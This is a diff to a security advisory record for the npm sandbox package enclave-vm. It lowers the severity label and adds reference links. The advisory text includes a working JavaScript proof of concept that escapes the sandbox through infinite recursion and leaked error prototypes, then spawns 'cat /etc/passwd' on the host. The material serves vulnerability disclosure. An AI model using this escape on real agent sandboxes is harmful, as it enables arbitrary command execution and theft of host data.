@@ -1,5 +1,5 @@
 {
-  "Severity": "CRITICAL",
+  "Severity": "MODERATE",
   "UpdatedAt": "2026-02-05T17:49:35Z",
   "Package": {
     "Ecosystem": "NPM",
@@ -15,6 +15,12 @@
       },
       {
         "Url": "https://github.com/agentfront/enclave/commit/2fcf5da81e7e2578ede6f94cae4f379165426dca"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25533"
+      },
+      {
+        "Url": "https://www.staicu.org/publications/usenixSec2023-SandDriller.pdf"
       },
       {
         "Url": "https://github.com/advisories/GHSA-x39w-8vm5-5m3p"
@@ -33,9 +39,9 @@
     "Description": "**Note:** The npm package has moved to `@enclave-vm/core` (formerly `enclave-vm`).  \nAll fixed versions and guidance refer to `@enclave-vm/core`.\n\n### Summary\nThe existing layers of security in enclave-vm are insufficient: The AST sanitization can be bypassed with dynamic property accesses, the hardening of the error objects does not cover the peculiar behavior or the vm module and the function constructor access prevention can be side-stepped by leveraging host object references.\n\n### Details\nThere is a bug in Node.js (https://www.staicu.org/publications/usenixSec2023-SandDriller.pdf) that makes the vm module leak host references inside the vm module in case of infinite recursion. An attacker can exploit these to escape the sandbox.\n\n### PoC\nThe following on was tested on Node.js v24.12.0 and enclave-vm 2.7.0.\n\n```js\nimport { Enclave } from 'enclave-vm';\n\n// Create enclave with a tool handler\nconst enclave = new Enclave({\n  timeout: 5000,\n  maxToolCalls: 10,\n  maxIterations: 1000,\n  toolHandler: async (toolName, args) =\u003e {\n    // Your tool execution logic\n    return { success: true, data: `Called ${toolName}` };\n  },\n});\n\n// Execute AgentScript code\nconst result = await enclave.run(`\nlet res = null, rootProt = null;\nlet a = () =\u003e{\ntry {\n  a();\n} catch (e) {\n  rootProt = e[[\"__proto__\"]][[\"__proto__\"]][[\"__proto__\"]];\n  res=e.stack\n}\n}\na();\nrootProt[[\"foo\"]] = rootProt[[\"toString\"]][[\"constructor\"]]  \nrootProt[[\"foo\"]](\"let options = {file: 'cat', args: [null,'/etc/passwd'], envPairs: [], stdio: [{ type: 'pipe', readable: true, writable: false },{ type: 'pipe', readable: false, writable: true },{ type: 'pipe', readable: false, writable: true } ]}; console.log(process.binding('spawn_sync').spawn(options).output[1].toString())\")();\n`);\n\n```\n### Impact\nSandbox escape and potential other escalations on FrontMCP/AgentFront/other Frontegg products.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2026-02-05T17:49:35Z",
-    "Severity": "CRITICAL",
+    "Severity": "MODERATE",
     "Summary": "Sandbox escape via infinite recursion and error objects",
-    "UpdatedAt": "2026-02-05T17:49:35Z",
+    "UpdatedAt": "2026-02-07T00:31:47Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 0,
